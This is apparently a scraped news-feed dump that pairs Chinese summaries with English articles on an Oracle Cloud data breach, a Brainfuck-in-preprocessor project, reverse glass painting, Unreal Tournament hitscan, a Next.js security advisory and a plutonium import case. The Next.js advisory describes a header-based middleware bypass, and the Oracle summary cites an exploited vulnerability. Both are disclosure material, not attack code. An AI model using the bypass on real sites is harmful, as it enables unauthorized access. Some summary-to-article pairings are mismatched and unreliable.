data.article_summary: 2025年3月，CloudSEK的XVigil监控系统发现一名为"rose87168"的黑客正在销售从Oracle Cloud的SSO和LDAP中窃取的600万条记录，涉及超过14万个租户。被盗数据包括JKS文件、加密SSO密码、密钥文件和企业管理器JPS密钥。攻击者自2025年1月起活跃，利用Oracle Cloud登录端点的未公开漏洞进行攻击，要求支付赎金以删除数据，并悬赏协助解密密码。分析显示，攻击者利用了Oracle Fusion Middleware中的已知漏洞CVE-2021-35587，该漏洞允许未认证的攻击者通过网络完全接管Oracle Access Manager。CloudSEK评估此威胁为中等信心但高严重性，并提供暴露检查服务。

Getting started
Since the preprocessor can't distinguish between the standard Brainfuck symbols, this implementation uses the following alternative instruction names:
Original
Instruction
Description
>
R
Move the tape head to the right
<
L
Move the tape head to the left
+
I
Increment the tape head
-
D
Decrement the tape head
.
A
Output the tape head as ASCII*
O
Output the tape head as a hexadecimal number
,
G
Read an input character and set the tape head to it
[
B
Jump past the matching ] if the cell at the pointer is 0
]
E
Jump back to the matching [ if the cell at the pointer is nonzero
*Note that there might be extra space inserted between symbols, because all preprocessors I know of disagree when spaces are inserted in
S(a)b
with
#define S(x) x
and different tokens in
a
and
b
.
Preprocessors/Compilers
tcc
: use with
tcc -P -E
. tcc has the fastest preprocessor I know of.
gcc
: use with
gcc -P -E -ftrack-macro-expansion=0
. If you can't use tcc I recommend using gcc over clang, because it's faster, and gives you incremental output.
clang
: use with
clang -P -E -fmacro-backtrace-limit=1
.
msvc: use with
cl /P /C /Zc:preprocessor
. You need
/Zc:preprocessor
, because otherwise msvc will use a non-standard confirming preprocessor implementation.
mcpp
: use with
mcpp -P -W0
.
-W0
is required, because the otherwise you'll get the warning "Replacement text ... of macro ... involved subsequent text", which is valid, but mcpp warns about it, because in "normal" code this is probably not indented behavior. There is also currently a
mcpp bug
, where the add lookup table segfaults the preprocessor, so you'll need to disable
BF_SUM
for mcpp to preprocess the code.
If you want to get more fine grain information of execution times, then you might want to patch tcc with
tinycc.diff
.
This adds the
__TIMER__
macro, which expands to the executed time and resets the timer, so the second
__TIMER__
in
__TIMER__ FOO __TIMER__
expands to the time it took to preprocess
FOO
.
How does this work?
Check out the
tutorial
, if you want to learn how I wrote this.

data.author: todsacerdoti
data.article_summary: 无法获取文章内容
data.comments_summary:
主要讨论点：多处理器环境下的CPU行为仿真及其复杂性

不同观点：
• [dooglius] 提出多处理器环境下仿真CPU行为的潜在问题。他认为如果处理器1调用了CPUID指令，而处理器2长时间未调用，仿真处理器2的行为必须非常精确，才能与处理器1保持一致性。这暗示了多处理器系统中仿真的一致性挑战。

• [userbinator] 提到了历史上类似的复杂情况，比如DOS下的Windows需要通过未公开的GEMMIS接口，在进入保护模式前退出V86模式。这表明在老系统中也有类似的底层硬件操作和兼容性问题。

• [mrnage] 没有提出观点，仅提供了一个网页存档的镜像链接，可能是为了补充相关背景信息。

• [gblargg] 分享了一个与音频模块处理器相关的技术细节，描述了如何通过巧妙的手段（如利用无限循环和动态修改指令）逐步恢复处理器状态。这个例子展示了在特定硬件条件下进行状态恢复的复杂操作。

• [snvzz] 对x86架构持负面态度，认为x86即将被淘汰，表达了对摆脱x86的期待。这与其他技术讨论形成对比，更多是关于对x86架构的情感评价。

补充讨论：
• 多处理器环境中的一致性问题是一个关键的技术挑战，特别是在仿真不同处理器的状态时。
• 讨论中提到了历史上类似的硬件操作问题，显示了底层硬件操作的复杂性在不同系统中具有一定的共性。
• [gblargg] 的例子展示了在特定硬件环境下，通过精细的操作实现状态恢复的实际案例，为理解仿真和恢复过程提供了具体的技术细节。
• [snvzz] 的评论虽然简短，但引发了对x86架构未来发展的讨论，与其他评论的技术性形成鲜明对比。

争议焦点：
• 主要集中在多处理器环境下仿真CPU行为时的一致性问题，特别是当不同处理器执行不同指令时如何保持状态的一致性。

data.title: Through a Glass Lushly: Michalina Janoszanka's Reverse Paintings (Ca. 1920s)
data.author: prismatic
data.article_summary: Michalina Janoszanka（1889–1952）是波兰艺术家，以担任画家Jacek Malczewski的模特和学生闻名，但她本人也是一位有才华的油画家。她接受过专业训练，作品主题传统，包括肖像、静物和宗教场景。然而，最引人注目的是她的玻璃反画，这种技术通过在玻璃背面层层上色完成。与传统波兰宗教图像的僵硬风格不同，Janoszanka的作品色彩鲜艳、超现实，描绘花卉、树木、鸟类和青蛙，具有独特的梦幻效果。同时期，美国艺术家也在探索玻璃反画，但Janoszanka的作品在技术和风格上独具一格，连接了民间传统与现代主义实验，值得重新评估。

Through a Glass Lushly: Michalina Janoszanka’s Reverse Paintings (ca. 1920s)
Buy as a Print
Michalina Janoszanka (1889–1952) is an artist better known for her role on the other side of the canvas, as the muse and mentee of famed Polish painter Jacek Malczewski (1854–1929). She posed for countless symbolist paintings, appearing alone, alongside Malczewski in double-portraits, among satyrs, and as Medusa. However, Janoszanka was more than a muse. She was also
an artist
in her own right. Trained in Kraków and Vienna, she became a strong oil painter. Her themes were traditional: portraits, still lifes, and religious scenes. But what most captured her mentor’s excitement, not to mention the attention of the Young Poland modernist art movement, was something else: the surreal, kaleidoscopic landscapes she painted directly onto glass.
Reverse painting, achieved by building up layers of pigment onto the backside of a pane of glass, has a long history. Having spread as far as China from its birthplace in fifteenth-century Italy, the technique was favored in Eastern Europe for devotional images and icons. These paintings could be produced quickly and cheaply, and “had the added attraction of reflecting the scant light in the dark rooms of the peasant homes”,
writes
scholar Phyllis Granoff. For all their strengths, however, reverse painting was not counted among European fine art. By Janoszanka’s time, the medium was firmly in the realm of folk art.
What Michalina did with reverse painting was entirely distinct from the stiff religious imagery of traditional Polish glass painting. Brilliant gem tones and metallic lines frame her subjects — lush flowers and trees, stylized birds and frogs — in shadowy landscapes. She achieves textures and tones that call to mind other mediums. Dense linework becomes lace-like butterfly wings. In
Winter
, swirled, watercolor blues form a marbled field reminiscent of stained glass. At the birds’ breasts, Janoszanka leaves visible brush strokes, evoking individual feathers.
Butterfly
juxtaposes traditional flower patterns — simplified, geometric — with life-like dry leaves. The result is whimsical and stylized, but not childish. In
Spring
, where Janoszanka sets glowing trees against an exploding coral sky, the effect is plainly psychedelic.
Across the Atlantic, reverse painting’s heyday had come and gone by the early 1900s. By layering not just paint but also crumpled metal foil over glass, American “tinsel painting” had stretched the limits of technique — but the medium, adopted mainly by middle-class women, was viewed as “feminine”. The craft had come to be seen as hackneyed and outdated, a Victorian throwback, and the twentieth century saw many such paintings “cracked and broken and thrown away”,
writes
curator Karli Wurzelbacher. But at that very moment, modernist painters began experimenting with the old technique. Artists like Marsden Hartley (1877–1943) and Rebecca Salsbury James (1891–1968) expanded on the traditional themes (flowers, still life, birds) and pushed reverse painting in novel directions: new color palettes, new approaches to line and space, new abstractions. These American experiments, beginning in the 1910s, coincided with Janoszanka’s work in Poland.
Viewed side by side, the artists’ respective experiments in glass painting could not have been more different. But in Maine, New Mexico, and Kraków, reverse painting presented new possibilities to a generation of modernist artists. There is no telling whether Janoszanka was aware of these other experimenters in avant-garde glass painting. It is also unclear if she faced the same gendered critique: the critic Paul Rosenfeld,
argues
Wurzelbacher, “cast Hartley’s ‘canvases and rectangles of glass’ as effeminate”, comparing them to “some sweet bit of handiwork . . . the design of a sampler, a piece of embroidery.” Though her name remains overshadowed by Malczewski, Janoszanka’s work presents a compelling case for reassessment. Her dreamlike glass paintings are a bridge between folk tradition and modernist experimentation. They raise unanswered questions not just about Janoszanka’s career, but also about modernism’s engagement with glass painting across cultural boundaries. Questions that can be answered, ultimately, only through a return to the archive.

43417398.article_summary: Michalina Janoszanka（1889–1952）是波兰艺术家，以担任画家Jacek Malczewski的模特和学生闻名，但她本人也是一位有才华的油画家。她接受过专业训练，作品主题传统，包括肖像、静物和宗教场景。然而，最引人注目的是她的玻璃反画，这种技术通过在玻璃背面层层上色完成。与传统波兰宗教图像的僵硬风格不同，Janoszanka的作品色彩鲜艳、超现实，描绘花卉、树木、鸟类和青蛙，具有独特的梦幻效果。同时期，美国艺术家也在探索玻璃反画，但Janoszanka的作品在技术和风格上独具一格，连接了民间传统与现代主义实验，值得重新评估。

data.article_summary: 这篇文章主要讨论了《虚幻竞技场》（Unreal Tournament）中的狙击步枪，特别是它在经典地图“Facing Worlds”中的使用。文章指出，尽管狙击步枪相比游戏中其他科幻武器显得普通，但其实它是最不现实的武器之一。游戏采用了“命中扫描”（Hitscan）机制，使得子弹瞬间击中目标，而不考虑现实中的弹道和重力影响。这种简化模型在1990年代的游戏中很常见，主要是由于技术限制和多人游戏同步的需求。文章还提到，随着技术发展，后来的游戏开始引入飞行时间和子弹下坠等更真实的物理机制。最后，作者鼓励读者分享文章并订阅，以获取更多关于游戏武器的讨论。
data.comments_summary:
主要讨论点：子弹在真实物理环境下的运动以及在游戏中的模拟

不同观点：
• [tempestn] 认为在现实中，水平发射的子弹和垂直下落的子弹不会以完全相同的速度下降。他指出，水平高速运动的子弹会受到空气阻力的影响，尤其是在垂直方向上，因为子弹周围的空气压力增加，导致下落时就像在密度更大的空气中下落一样。此外，水平飞行的子弹保持水平姿态，而下落的子弹可能会翻转，这也影响了下落速度。不过，他承认这些影响相对较小。

• [pimlottc] 将讨论转向了历史上的弹道模拟游戏，提到了GORILLA.BAS，这是一个经典的弹道轨迹游戏。

• [evnp] 提到现代计算机游戏无法模拟复杂的物理现象，如激波、流体动力学效应、科里奥利效应和马格努斯效应等。不过，他引用了《使命召唤4》中的切尔诺贝利狙击场景，指出某些游戏在一定程度上还是能提供逼真的体验。

• [bob1029] 提到了《虚幻竞技场》中的特殊武器，如闪电枪，认为这些武器比常规武器更具吸引力，因为它们发射的不是普通的子弹，而是等离子或爆炸性物质。

• [apt-apt-apt-apt] 提出使用激光枪可以解决子弹弹道的问题，尤其是在远距离（如100英里）的情况下。不过，他也引用了GPT的观点，指出在这种距离下，目标会因为光学和大气干扰而难以看清。

• [uzyn] 认为在像《虚幻竞技场》这样的快节奏游戏中，让玩家瞄准目标上方几英寸的狙击玩法并不有趣。

• [Zardoz84] 提到《虚幻》及其模组中使用了非即时命中（非hitscan）的子弹投射物机制，这些子弹会沿直线飞行，但并不会完全模拟现实中的物理效应，只是为了避免即时命中或未命中的简单机制。

• [giantrobot] 对文章中的循环动画感到不适，认为这些动画让阅读页面变得令人恶心。

• [Fokamul] 批评文章作者显然没有玩过模拟类游戏，如《武装突袭》。他认为在模拟游戏中，子弹的物理效果应该更加真实，而不是像《使命召唤》这种街机风格游戏那样使用简化的hitscan机制。

• [A_D_E_P_T] 认为文章过于吹毛求疵，指出游戏中的武器通常不会详细描述子弹的直径、弹道系数或速度。他提到某些实验性武器可以以极高速度发射子弹，并认为在科幻游戏中假设存在这样的武器是合理的。

补充讨论：
• 争议的焦点之一是hitscan机制在游戏中的适用性。部分评论者认为在快节奏游戏中可以接受这种简化，但在模拟类游戏中则需要更真实的弹道模拟。
• 另一个值得注意的点是对科幻游戏中武器设定的讨论，部分评论者认为即便现实中不常见或不实际，科幻游戏有其独特的设定自由。

Unreal Tournament weapons: Part 3
March 20, 2025
12 minutes
Welcome back, my new and regular readers alike. I’m doubling down on
Unreal Tournament
this week, following on from
last week’s
discussion of the Flak Cannon. If you need to get up to speed on
Unreal Tournament
(UT) you should read my previous posts on the game: Firstly on the
Rocket Launcher
, then the
Flak Cannon
. Today we’ll examine the
Sniper Rifle
with our usual pedantic criticism.
Although the Sniper Rifle is one of the least sci-fi of the UT weapons, its effects are less plausible than the Rocket Launcher and the Flak Cannon. We’ll go through what these implausibilities are, as well as the reasons for them. This ties into how video games are designed and built: dissecting weapons like the UT Sniper Rifle allows us to take a look under the hood of the game and get an insight into the choices and limitations facing designers, especially with older games like UT.
As always, if you enjoy this post, I would appreciate if you shared it with like-minded nerds and pedants. If you haven’t subscribed yet, please do so using the link below so that you never miss a post. And finally, please weigh in in the comments section below with your own thoughts, especially if I’ve missed things. Hope you enjoy!
Type your email…
Subscribe
<< Flak Cannons and shotguns
TBC >>
“Facing Worlds” is a video game classic…
It’s impossible to talk about
Unreal Tournament’s
Sniper Rifle without talking about one of its most iconic maps: Facing Worlds.
Widely
acknowledged
as one of the genre’s best, it is a small, open, capture the flag
1
map:
The map consists of two towers connected by a walkway and suspended in orbit above an Earth-like planet. It’s an exquisite setting, albeit with a quarter of a century less computer graphics development. The beauty of the setting is accentuated by the haunting soundtrack.
All of this beauty is, of course, merely a backdrop for the epic Sniper Rifle duels which the map is well-known for. Each tower provides about a dozen spots where you have an unobstructed view of the enemy tower and the route the enemy need to traverse to get to your tower. This makes sniping a guaranteed high-impact strategy: there’s no alternative but to walk onto the “sniper highway” that is the bridge connecting the towers. Of course the challenge is that while the towers give great vantage points, they don’t offer much cover or concealment
2
. So while you’re busy plugging enemies on the far side, they’re busy finding and shooting you, which gives the map its cruel charm.
Today’s post isn’t about the ins and outs of sniper tactics and techniques, mainly because I’m unqualified in this area and can only give second-hand experiences. Suffice to say that camouflage and concealment are just as important as marksmanship for a sniper team.
But I want to focus more on the weapon itself: the
UT Sniper Rifle
:
There are plenty of these beauties and their and associated ammunition stashed throughout each tower, feeding the fuel of the famous sniper duels. Compared to the rest of the exotic UT arsenal, these seem unremarkable, boring even. They don’t fire bright bolts of plasma or glowing, exploding goo. They don’t cause big explosions. Even the shot’s report is dull and drab in comparison to the noises you get from more fanciful weapons like the
Rocket Launcher
or the
Ripper
.
Don’t be fooled: this weapon is perhaps the most unrealistic of the lot. We’ll discuss why in the next section.
…but only by ignoring the laws of physics
Using the Sniper Rifle in Facing Worlds, or any UT map, is very simple: right click to look down the telescopic sight, left click to fire:
Poor Cilia can’t catch a break
This is a gameplay model of sniper rifles (or anything with a scope or sight) which is used in many other shooters. Aim, shoot, and hit (or miss). The game uses a simple model logic called “Hitscan” to determine whether each shot is a hit or not:
This is why bullets seem to cross the map instantly: the game models them that way. This, to state the obvious, is not how real-life bullets work. A real life-logic tree of whether a shot is a hit or a miss would look something like this:
This model was not something that the computer games of the 1990s were able to replicate, especially for rapid fire weapons. Add to this the complexity of multiplayer games, where PCs had to simulate gameplay and communicate and synchronise it across multiple machines over comparatively slow internet connections, and you can see why a simple model of bullet accuracy was preferable.
This began to change not long after the release of UT. Of course, modelling projectiles in video games was nothing new:
Space Invaders
(1978): GIF from
XanderBakker
on
Esri
.
By the early 2000s, shooters were coming onto the market which modelled time of flight and bullet drop in a parabolic arc.
Operation Flashpoint
was a Cold War era West vs. East
3

data.title: Next.js version 15.2.3 has been released to address a security vulnerability
data.author: makepanic
data.article_summary: Next.js发布了15.2.3版本，以修复一个安全漏洞（CVE-2025-29927）。该漏洞涉及内部头字段`x-middleware-subrequest`，可能导致中间件被跳过，从而绕过关键安全检查，如授权验证。自托管的Next.js应用，特别是使用`next start`和输出为"standalone"的应用，需立即更新。受影响的版本包括15.x、14.x和13.x，补丁已发布。若无法立即更新，建议阻止包含`x-middleware-subrequest`头的外部请求。Cloudflare用户可启用WAF规则防护，而Vercel和Netlify托管的应用不受影响。Next.js团队还将发布针对v12的补丁，并计划改进与合作伙伴的沟通，开设了伙伴邮件列表。
data.comments_summary:
主要讨论点：Next.js 中间件漏洞及其安全性和设计问题

不同观点：
• **ratorx** 认为，Next.js 的中间件设计存在根本性缺陷，尤其是中间件与用户输入使用相同机制进行通信，这使得用户请求验证和中间件代码分离。此外，允许除白名单外的任何头部信息通过，这像是潜在的安全隐患。同时，ratorx 质疑框架为不好的服务器设计提供支持，并提出是否存在不适用有向无环图 (DAG) 请求流程的具体用例。

• **smlx** 提到 Next.js 有类似的漏洞历史，指出之前通过添加特定头部可以导致服务器端请求伪造 (SSRF) 的问题。他还批评 Next.js 的补丁发布策略不透明，尤其是对旧版本的支持问题，并认为使用 Next.js 对于重视安全和维护的项目来说风险很大。

• **ronbenton** 关注漏洞报告后的处理时间，质疑为何该安全问题在报告后两周才开始处理，并表达了对认证可被轻易绕过的担忧。

• **mikeocool** 认为 Next.js 增加了前端开发的复杂性，但对大多数应用来说价值有限。他特别指出文件路由和服务器端渲染在一些场景下可能有用，但对于多数应用来说，复杂性远超其带来的价值。

Next.js version 15.2.3 has been released to address a security vulnerability (
CVE-2025-29927
). Additionally, backported patches are available.
We recommend that all self-hosted Next.js deployments using
next start
and

should
update
immediately.
Continue reading for more details on the CVE.
Timeline

We are also publishing a backport for v12. We will update this post as they are released.
Vulnerability details
Next.js uses an internal header
x-middleware-subrequest
to prevent recursive requests from triggering infinite loops. The security report showed it was possible to skip running Middleware, which could allow requests to skip critical checks—such as authorization cookie validation—before reaching routes.
Impact scope
Affected
Self-hosted Next.js applications using Middleware (
next start
with output:
standalone
)
This affects you if you rely on Middleware for auth or security checks, which are not then validated later in your application.
Applications using Cloudflare can turn on a
Managed WAF rule
Not affected
Applications hosted on Vercel
Applications hosted on Netlify
Applications deployed as static exports (Middleware not executed)
Patched versions
For Next.js 15.x, this issue is fixed in
15.2.3
For Next.js 14.x, this issue is fixed in
14.2.25
For Next.js 13.x, this issue is fixed in
13.5.9
If patching to a safe version is infeasible, it is recommended that you prevent external user requests which contain the
x-middleware-subrequest
header from reaching your Next.js application.
We are also publishing a backport for v12. We will update this post as they are released.
Our security responsibility
Next.js has published
16 security advisories
since 2016. Over time, we've continued to improve how we gather, patch, and disclose vulnerabilities.
GitHub Security Advisories and CVEs are industry-standard approaches to notifying users, vendors, and companies of vulnerabilities in software. While we have published a CVE,
we missed the mark
on partner communications.
To help us more proactively work with partners depending on Next.js, and other infrastructure providers, we are opening a partner mailing list. Please reach out to
partners@nextjs.org
to be included.

data.title: 'Naive' science fan faces jail for plutonium import
data.author: geox
data.article_summary: Emmanuel Lidden, a 24-year-old Australian man and self-described "science nerd," faces jail time for ordering radioactive plutonium over the internet, violating nuclear non-proliferation laws. Despite his claim of simply collecting elements of the periodic table, Lidden triggered a hazmat response when the material was delivered to his parents' home in Sydney. His lawyer argued Lidden had no malicious intent and described him as an "innocent collector," but prosecutors disagreed, emphasizing the seriousness of his actions. Lidden lost his job as a train driver after disclosing the investigation and now works at a fast-food restaurant. He pleaded guilty and awaits sentencing, which could result in up to 10 years in jail.
